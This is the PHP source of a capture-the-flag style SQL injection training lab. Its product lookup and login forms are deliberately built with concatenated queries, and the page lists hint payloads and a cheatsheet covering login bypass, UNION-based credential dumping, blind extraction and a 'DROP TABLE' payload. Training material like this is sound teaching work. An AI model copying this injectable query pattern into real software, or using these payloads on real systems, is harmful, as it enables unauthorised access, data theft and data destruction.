<?php
/**
 * SQL Injection Lab - INTENTIONALLY VULNERABLE
 * Do NOT use in production.
 */
$host = 'db';
$db   = 'testdb';
$user = 'root';
$pass = 'lab_password';

$conn = new mysqli($host, $user, $pass, $db);
$conn->set_charset("utf8mb4");

$results = '';
$error = '';

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $query = "SELECT id, name, price, description FROM products WHERE id = $id";
    $result = $conn->query($query);
    
    if ($result && $result->num_rows > 0) {
        $results = '<table border="1" cellpadding="8" cellspacing="0" style="border-color:#00ff41;width:100%">';
        $results .= '<tr style="background:#1a1a2e"><th>ID</th><th>Name</th><th>Price</th><th>Description</th></tr>';
        while ($row = $result->fetch_assoc()) {
            $results .= "<tr><td>{$row['id']}</td><td>{$row['name']}</td>";
            $results .= "<td>\${$row['price']}</td><td>{$row['description']}</td></tr>";
        }
        $results .= '</table>';
    } else {
        $error = "Error: " . $conn->error;
    }
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $login_query = "SELECT * FROM users WHERE username = '$username' AND password_hash = '$password'";
    $login_result = $conn->query($login_query);
    
    if ($login_result && $login_result->num_rows > 0) {
        $results = '<div style="color:#00ff41;font-size:1.5em">LOGIN SUCCESSFUL! FLAG{sql1_auth_byp4ss}</div>';
    } else {
        $error = "Login failed. Error: " . $conn->error;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SQL Injection Lab</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a1a; color: #00ff41; padding: 30px; }
        h1 { color: #ff4444; text-shadow: 0 0 10px #ff0000; }
        h2 { color: #0affed; }
        input, button { font-family: 'Courier New', monospace; padding: 8px; margin: 5px; background: #0d1117; color: #00ff41; border: 1px solid #00ff41; }
        button { background: #00ff41; color: #000; cursor: pointer; font-weight: bold; }
        .result { background: #0d1117; padding: 15px; margin: 15px 0; border: 1px solid #00ff41; }
        .error { color: #ff4444; }
        .hint { color: #ffff00; background: #1a1a2e; padding: 10px; border: 1px solid #ffff00; margin: 10px 0; }
        pre { color: #0affed; background: #0d1117; padding: 10px; }
        a { color: #0affed; }
    </style>
</head>
<body>

<h1>SQL INJECTION LAB</h1>
<p style="color:#ff4444">WARNING: This application is intentionally vulnerable!</p>

<h2>Product Lookup</h2>
<div class="hint">
    TRY: <code>1 OR 1=1</code> or <code>1 UNION SELECT 1,2,3,4</code> or <code>1' OR '1'='1</code>
</div>
<form method="GET">
    Product ID: <input type="text" name="id" value="1" style="width:300px">
    <button type="submit">Search</button>
</form>

<div class="result">
    <?php echo $results; ?>
    <?php if ($error) echo "<p class='error'>$error</p>"; ?>
</div>

<h2>Login Bypass</h2>
<div class="hint">
    TRY Username: <code>admin' --</code> Password: <code>anything</code>
</div>
<form method="POST">
    Username: <input type="text" name="username" style="width:300px"><br>
    Password: <input type="text" name="password" style="width:300px"><br>
    <button type="submit">Login</button>
</form>

<h2>Cheatsheet</h2>
<pre>
' OR 1=1 --                    Basic bypass
' OR '1'='1                    Alternative bypass
admin' --                      Login bypass
1 UNION SELECT NULL,NULL,NULL  Column count
1 UNION SELECT username,password FROM users--  Dump data
' AND SUBSTR(sql,1,1)='s'--    Blind extraction
'; DROP TABLE users--          Destructive
</pre>

<p><a href="index.php">Back to Lab Menu</a></p>

</body>
</html>
